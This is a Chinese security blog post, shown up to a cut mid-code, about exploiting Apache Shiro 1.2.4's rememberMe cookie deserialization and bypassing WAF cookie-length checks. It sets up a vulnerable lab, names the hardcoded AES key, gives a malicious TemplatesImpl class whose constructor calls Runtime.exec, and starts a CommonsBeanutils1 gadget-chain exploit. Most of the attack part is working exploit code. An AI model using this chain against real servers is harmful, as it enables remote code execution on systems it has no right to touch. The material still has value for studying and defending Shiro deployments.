---
title: Shiro 中 Cookie 长度过长 bypass
url: https://mp.weixin.qq.com/s/Q9zQeZjl4ly-nXqvLK9UNA
source: Doonsec's feed
date: 2026-03-02
fetch_date: 2026-03-03T04:06:15.070752
---

# Shiro 中 Cookie 长度过长 bypass

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ULOszTo2RiaDL8ZF5EJmRs0O22xY5XkdGpoODqPMfkRicAABvZbygMnkr89UmZMbEKRA7Mib0iaNR9aaxCL5RFdkiclbDIoAanrw3OxMNVJeKqn4/0?wx_fmt=jpeg)

# Shiro 中 Cookie 长度过长 bypass

IceCliffs
IceCliffs

Gh0xE9

![]()

在小说阅读器中沉浸阅读

> 此篇文章为历史存货，部分内容已经过时，请酌情观看。

言归正传，我们来思考一下 Shiro Cookie 长度太长的话要怎么 bypass 一些在线 WAF 长度检测，首先准备以下环境

往期精彩

[通过提示注入在LLM大语言模型中制造漏洞](https://mp.weixin.qq.com/s?__biz=MzAwNTc5MTMyNg==&mid=2247500827&idx=1&sn=d88cef6e9a2f7a84af2bce66150a11f9&scene=21#wechat_redirect)

[警惕开源 Polymarket 交易机器人供应链投毒风险](https://mp.weixin.qq.com/s?__biz=MzAwNTc5MTMyNg==&mid=2247500813&idx=1&sn=71ab5f4d629b786c8eb4602071546606&scene=21#wechat_redirect)

[用 Dify 处理乌云前辈们的报告并做成知识库能收获些什么？](https://mp.weixin.qq.com/s?__biz=MzAwNTc5MTMyNg==&mid=2247500763&idx=1&sn=1d36af217fc0247221ce618671cef9f3&scene=21#wechat_redirect)

[为什么说 Obsidian 是世界上最好的笔记软件之一](https://mp.weixin.qq.com/s?__biz=MzAwNTc5MTMyNg==&mid=2247500748&idx=1&sn=68cc79baea11ad48479e2c900b349083&scene=21#wechat_redirect)

## 环境

pom.xml

```
<dependencies>
  <dependency>
    <groupId>org.apache.shiro</groupId>
    <artifactId>shiro-core</artifactId>
    <version>1.2.4</version>
</dependency>
<dependency>
    <groupId>org.apache.shiro</groupId>
    <artifactId>shiro-web</artifactId>
    <version>1.2.4</version>
</dependency>
<dependency>
    <groupId>commons-beanutils</groupId>
    <artifactId>commons-beanutils</artifactId>
    <version>1.8.3</version>
</dependency>
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>

<dependency>
    <groupId>org.slf4j</groupId>
    <artifactId>slf4j-simple</artifactId>
    <version>1.7.30</version>
</dependency>
<dependency>
    <groupId>javax.servlet</groupId>
    <artifactId>javax.servlet-api</artifactId>
    <version>3.1.0</version>
    <scope>provided</scope>
</dependency>
</dependencies>
```

LoginServlet.java

```
package com.study.servlet;

import org.apache.shiro.SecurityUtils;
import org.apache.shiro.authc.UsernamePasswordToken;
import org.apache.shiro.subject.Subject;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@WebServlet("/login")
publicclassLoginServletextendsHttpServlet {
    @Override
    protectedvoiddoPost(HttpServletRequest req, HttpServletResponse resp)throws ServletException, IOException {
        Stringuser= req.getParameter("username");
        Stringpass= req.getParameter("password");
        StringrememberMe= req.getParameter("rememberMe");
        UsernamePasswordTokentoken=newUsernamePasswordToken(user, pass);
        if (rememberMe != null && rememberMe.equals("on")) {
            token.setRememberMe(true);
        }
        Subjectsubject= SecurityUtils.getSubject();
        try {
            subject.login(token);
            resp.getWriter().println("Login Success! Welcome, " + user);
        } catch (Exception e) {
            resp.getWriter().println("Login Failed: " + e.getMessage());
        }
    }
}
```

shiro.ini

```
[main]
# 仅仅保留最基本的定义
[users]
admin = 123456
[urls]
/** = anon
```

## 常规手工攻击姿势

一般 Shiro 打法很简单，我这里选的版本为 `shiro-core 1.2.4`，高版本的后续再说，其打法总结就是 Apache Shiro 的记住我 `rememberMe` 功能在处理 Cookie 时，会对这个字段进行 base64 解码，然后 AES 解密，再然后反序列化，也就是说我们只要获得到了 AES 加密的密钥，那么就可以构造任意的反序列化对象，然后进行加密发送，在 1.2.4 版本，Shiro 的 key 都是硬编码的，这个大家都知道，你可以在 `org.apache.shiro.mgt.AbstractRememberMeManager#DEFAULT_CIPHER_KEY_BYTES` 找到其 key 为 `kPH+bIxk5D2deZiIxcaaaA==`

![image-20260302224603194](https://mmbiz.qpic.cn/mmbiz_png/ULOszTo2RiaA8xU51h5fOaM55VPh2m8OiaOjOt7mwbpREGH7SrbYf3DPVva6tvmvGOwCBOpzcibzZGaQ1CytFZIOYmTaxRTCymgSsBtt0lyPV0/640?wx_fmt=png&from=appmsg "null")

image-20260302224603194

然后默认情况下 Shiro 本身是依赖了 `Commons-Beanutils` 这个库，不过再打的时候可能会遇到一些版本与本地环境不一致，导致反序列化的时候出现 `serialVersionUID` 不匹配的问题

![image-20260302224850120](https://mmbiz.qpic.cn/sz_mmbiz_png/ULOszTo2RiaDuXXdv1klZ7wmJCfZPI5WT0GoicWNg2QUxq9SNicbqQlkO8fhDoBxkqfbegjvDzZpFtaibZxZjGCPAnvtIgVmjkicMVxpUtt4XdpE/640?wx_fmt=png&from=appmsg "null")

image-20260302224850120

并且 Shiro 自带的 CB 库不包含完整的 `Commons-Collections`，所以我们在打的时候部分依赖 CC 的链子会失效，那么解决方法就是确保本地的 CB 和 CC 库版本与 Shiro 环境中的版本是对应上的，例如我这里用的是 `Commons-Beanutils 1.8.3` 和 `Commons-Collections 3.1`

```
<dependencies>
    <dependency>
        <groupId>org.apache.shiro</groupId>
        <artifactId>shiro-core</artifactId>
        <version>1.2.4</version>
    </dependency>
    <dependency>
        <groupId>org.apache.shiro</groupId>
        <artifactId>shiro-web</artifactId>
        <version>1.2.4</version>
    </dependency>
    <dependency>
        <groupId>commons-beanutils</groupId>
        <artifactId>commons-beanutils</artifactId>
        <version>1.8.3</version>
    </dependency>

    <dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.2.1</version>
    </dependency>
    <dependency>
        <groupId>org.slf4j</groupId>
        <artifactId>slf4j-simple</artifactId>
        <version>1.7.30</version>
    </dependency>
    <dependency>
        <groupId>javax.servlet</groupId>
        <artifactId>javax.servlet-api</artifactId>
        <version>3.1.0</version>
        <scope>provided</scope>
    </dependency>
</dependencies>
```

然后接下来就是手动攻击了，我们得先编写一个恶意类，比如 `calculator.java`，继承 `AbstractTranslet`，然后写一个构造函数执行

```
package exp;
import java.io.IOException;
publicclasscalculatorextendscom.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet {
    publiccalculator() {
        try {
            Runtime.getRuntime().exec("open -a Calculator");
        } catch (Exception e) {}
    }
    @Override
    publicvoidtransform(com.sun.org.apache.xalan.internal.xsltc.DOM d, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] s) {}
    @Override
    publicvoidtransform(com.sun.org.apache.xalan.internal.xsltc.DOM d, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator di, com.sun.org.apache.xml.internal.serializer.SerializationHandler s) {}
}
```

接着编写 exp 来进行利用，比如我这里通过 `CommonsBeanutils1`来进行利用，具体 sink 就是`BeanComparator.compare()``PropertyUtils.getProperty()``TemplatesImpl.getOutputProperties()``TemplatesImpl.newTransformer()`**`TemplatesImpl.getTransletInstance()`** **`Runtime.exec()`**

```
package exp;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;
publicclassexp {
    publicstaticvoidsetFieldValue(Object object, String fieldName, Object value)throws Exception {
        Fieldfield= object.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(object, value);
    }
    publicstatic Object getPayload()throws Exception {
        byte[] code = Files.readAllBytes(Paths.get("/Users/icecliffs/Documents/Coding/java_shiro/target/classes/exp/Calculator.class"));
        TemplatesImpltemplates=newTemplatesImpl();
        setFieldValue(templates, "_bytecodes", newbyte[][]{code});
        setFieldValue(templates, "_name", "Pwned");
        setFieldValue(templates, "_tfactory", newTransformerFactoryImpl());
        finalBeanComparatorcomparator=newBeanComparator(null);
        PriorityQueue<Object> queue = newPriorityQueue<>(2, comparator);
        queue.add(1);
        queue.add(1);
        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", newObject[]{templates, templates});
        return queue;
    }
    publicstaticvoidmain(String[] args)throws Exception {
        ObjectpayloadObject= getPay...